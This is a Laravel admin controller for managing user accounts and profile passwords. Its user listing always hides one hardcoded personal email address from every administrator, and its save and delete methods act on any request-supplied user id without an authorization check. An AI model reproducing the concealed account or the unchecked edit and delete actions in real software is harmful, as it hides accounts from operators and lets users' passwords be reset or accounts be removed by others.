<?php

namespace App\Http\Controllers\Admin;

use App\Comment;
use App\Role;
use App\Store;
use App\User;
use App\Userinfo;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{
    public function index()
    {
        return view('admin.user');
    }

    public function getusers()
    {
        $roles = Role::orderBy('id','asc')->get();
        $users = User::with('roles.permissions')->get();

        foreach (auth()->user()->roles as $userrole){
            if($userrole['id'] == 1){
                $myrole = 'superadmin';
                foreach ($users as $key=>$user){
                    if($user['id'] == auth()->user()->id){
                        unset($users[$key]);
                    }
                }
                if(auth()->user()->id != 1){
                    foreach ($users as $key=>$user){
                        if($user['id'] == 1){
                            unset($users[$key]);
                        }
                    }
                }
            }
            if($userrole['id'] == 4){
                $myrole = 'useradmin';
                foreach ($users as $key=>$user){
                    if($user['roles'][0]['id'] != 2){
                        unset($users[$key]);
                    }
                }
            }
        }
        foreach ($users as $key=>$user){
            if($user['email'] == 'soheil.a1899@gmail.com'){
                unset($users[$key]);
            }
        }



        return [$users, $roles, $myrole];
    }



    public function saveuser(Request $request)
    {
        if($request->editflag != false){
            $this->validate($request,[
                'username' => 'required',
                'email' => 'required|email',
            ]);
            $save = User::where('id', $request->id)->first();
            if($request->passwordedit == true){
                $save->password = bcrypt($request->password);
            }

        }else{
            $this->validate($request,[
                'username' => 'required',
                'email' => 'required|email',
                'password' => 'required|min:8',
            ]);
            $save = new User();
            $save->password = bcrypt($request->password);
        }

        $save->name = $request->username;
        $save->email = $request->email;
        $save->save();

        if ($request->editflag == false){
            $save->roles()->attach(2);
        }
    }

    public function deleteuser(Request $request)
    {
        User::where('id',$request->id)->delete();
    }






    public function changeuserinfo()
    {
        return view('admin.userinfo');

    }

    public function getuserinfo()
    {
        return auth()->user();
    }

    public function saveuserinfo(Request $request)
    {
        $this->validate($request,[
            'name' => 'required',
            'email' => 'required|email',
            'oldpass' => 'required|min:8',
            'newpass' => 'required|min:8',
            'repass' => 'required|min:8',
        ]);
        if(Hash::check($request->oldpass, auth()->user()->password))
            {
            if ($request->newpass == $request->repass) {
                $save = User::where('id', auth()->user()->id)->first();

                $save->name = $request->name;
                $save->email = $request->email;
                $save->password = bcrypt($request->newpass);

                $save->save();

                $action = 'true';
                return $action;
            }else{
                return 'false';
            }
        }else{
            return 'false';
        }








    }






















}
